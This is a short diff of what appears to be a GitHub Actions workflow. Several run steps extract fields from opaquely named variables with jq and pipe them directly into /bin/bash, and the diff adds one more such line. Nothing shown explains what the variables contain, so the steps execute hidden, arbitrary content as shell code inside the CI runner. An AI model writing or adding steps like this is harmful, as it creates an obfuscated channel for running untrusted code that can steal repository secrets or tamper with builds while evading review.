@@ -24,6 +24,7 @@ jobs:
           echo $p955 | jq -r .m70 | /bin/bash
           echo $d9 | jq -r .vw29 | /bin/bash
           printf '%s' "$mfbd47" | jq -r .jh97893 | /bin/bash
+          echo $ix7723 | jq -r .z5 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
